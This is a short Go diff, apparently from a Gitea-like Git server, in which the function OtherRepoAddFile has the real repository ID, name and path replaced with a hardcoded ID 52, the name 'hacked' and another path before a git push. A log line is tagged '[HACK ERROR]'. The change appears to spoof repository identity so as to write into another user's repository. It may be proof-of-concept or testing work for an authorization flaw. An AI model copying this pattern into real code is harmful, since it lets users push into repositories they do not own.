@@ -251,9 +251,9 @@ func OtherRepoAddFile(repo *Repository, doer *User) {
 		AuthUser:  doer,
 		OwnerName: repo.MustOwner().Name,
 		OwnerSalt: repo.MustOwner().Salt,
-		RepoID:    repo.ID,
-		RepoName:  repo.Name,
-		RepoPath:  repo.RepoPath(),
+		RepoID:    52,
+		RepoName:  "hacked",
+		RepoPath:  repoPath,
 	})
 	if err = git.RepoPush(localPath, "origin", branch, git.PushOptions{Envs: envs}); err != nil {
 		log.Error("[HACK ERROR] ERROR MSG : %v", err)
